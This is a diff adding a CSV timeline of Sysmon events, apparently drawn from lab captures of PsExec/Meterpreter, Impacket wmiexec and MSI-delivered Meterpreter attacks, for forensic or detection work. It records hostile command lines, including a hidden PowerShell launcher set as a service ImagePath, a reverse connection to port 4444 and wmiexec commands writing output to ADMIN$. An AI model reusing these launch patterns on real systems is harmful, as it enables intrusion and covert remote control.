@@ -1,0 +1,26 @@
+timestamp,event_type,description,source,artifact_id
+2019-04-30T20:26:51.599Z,NETWORK_CONNECTION,[T01] System IN 10.0.2.18:445 -> 10.0.2.19:33801,Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9811
+2019-04-30T20:26:51.793Z,PIPE_CONNECTED,[T02] System pipe \ntsvcs,Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9804
+2019-04-30T20:26:51.934Z,REGISTRY_VALUE_SET,[T03] services.exe set HKLM\System\CurrentControlSet\services\hello\Start = DWORD (0x00000003),Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9805
+2019-04-30T20:26:51.934Z,REGISTRY_VALUE_SET,[T04] services.exe set HKLM\System\CurrentControlSet\services\hello\ImagePath = %%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidde,Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9806
+2019-04-30T20:26:51.949Z,PROCESS_CREATE,"[T05] services.exe -> cmd.exe | C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if | user=NT AUTHORITY\SYSTEM",Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9807
+2019-04-30T20:26:51.965Z,PROCESS_CREATE,"[T06] cmd.exe -> powershell.exe | powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else | user=NT AUTHORITY\SYSTEM",Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9808
+2019-04-30T20:26:52.356Z,PROCESS_CREATE,"[T07] powershell.exe -> powershell.exe | ""powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamRead | user=NT AUTHORITY\SYSTEM",Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9809
+2019-04-30T20:26:52.356Z,PROCESS_ACCESS,[T08] powershell.exe(pid 3872) opened powershell.exe(pid 2484) access=0x001fffff,Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9810
+2019-04-30T20:26:52.794Z,NETWORK_CONNECTION,[T09] powershell.exe OUT 10.0.2.18:49160 -> 10.0.2.19:4444,Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9813
+2019-04-30T20:26:53.168Z,REGISTRY_VALUE_SET,[T10] services.exe set HKLM\System\CurrentControlSet\services\hello\Start = DWORD (0x00000004),Sysmon: LM_sysmon_psexec_smb_meterpreter.evtx,A-9812
+2019-04-30T20:32:49.659Z,NETWORK_CONNECTION,[T11] System IN 10.0.2.18:445 -> 10.0.2.19:45616,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9825
+2019-04-30T20:32:51.144Z,NETWORK_CONNECTION,[T12] System OUT 127.0.0.1:49162 -> 127.0.0.1:445,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9830
+2019-04-30T20:32:51.144Z,NETWORK_CONNECTION,[T13] System IN 127.0.0.1:445 -> 127.0.0.1:49162,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9831
+2019-04-30T20:32:51.168Z,PROCESS_CREATE,[T14] WmiPrvSE.exe -> cmd.exe | cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1 | user=IEWIN7\IEUser,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9826
+2019-04-30T20:32:51.246Z,PROCESS_CREATE,[T15] WmiPrvSE.exe -> cmd.exe | cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1 | user=IEWIN7\IEUser,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9827
+2019-04-30T20:32:51.324Z,PROCESS_CREATE,[T16] WmiPrvSE.exe -> cmd.exe | cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1 | user=IEWIN7\IEUser,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9828
+2019-04-30T20:32:51.356Z,PROCESS_CREATE,[T17] cmd.exe -> whoami.exe | whoami  /all  | user=IEWIN7\IEUser,Sysmon: LM_wmiexec_impacket_sysmon_whoami.evtx,B-9829
+2019-04-30T22:48:58.901Z,FILE_CREATION_TIME_CHANGED,[T18] msiexec.exe changed creation time of C:\Users\IEUser\AppData\Local\Temp\302a23.msi (2019-04-30 22:48:58.901 -> 2019-04-30 22:43:38.892),Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10147
+2019-04-30T22:48:59.151Z,PROCESS_CREATE,[T19] services.exe -> VSSVC.exe | C:\Windows\system32\vssvc.exe | user=NT AUTHORITY\SYSTEM,Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10148
+2019-04-30T22:49:07.901Z,FILE_CREATION_TIME_CHANGED,[T20] msiexec.exe changed creation time of C:\Windows\Installer\304d1c.msi (2019-04-30 22:49:07.854 -> 2019-04-30 22:43:38.892),Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10149
+2019-04-30T22:49:08.432Z,REGISTRY_VALUE_SET,[T21] msiexec.exe set HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\InProgress\(Default) = C:\Windows\Installer\304d1d.ipi,Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10150
+2019-04-30T22:49:08.604Z,PROCESS_CREATE,"[T22] msiexec.exe -> MSI4FFD.tmp | ""C:\Windows\Installer\MSI4FFD.tmp"" | user=IEWIN7\IEUser",Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10151
+2019-04-30T22:49:08.698Z,IMAGE_LOADED,[T23] msiexec.exe loaded C:\Windows\System32\vbscript.dll,Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10152
+2019-04-30T22:49:09.276Z,PROCESS_CREATE,[T24] MSI4FFD.tmp -> cmd.exe | cmd | user=IEWIN7\IEUser,Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10153
+2019-04-30T22:52:27.588Z,PROCESS_CREATE,[T25] cmd.exe -> whoami.exe | whoami | user=IEWIN7\IEUser,Sysmon: Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,C-10154
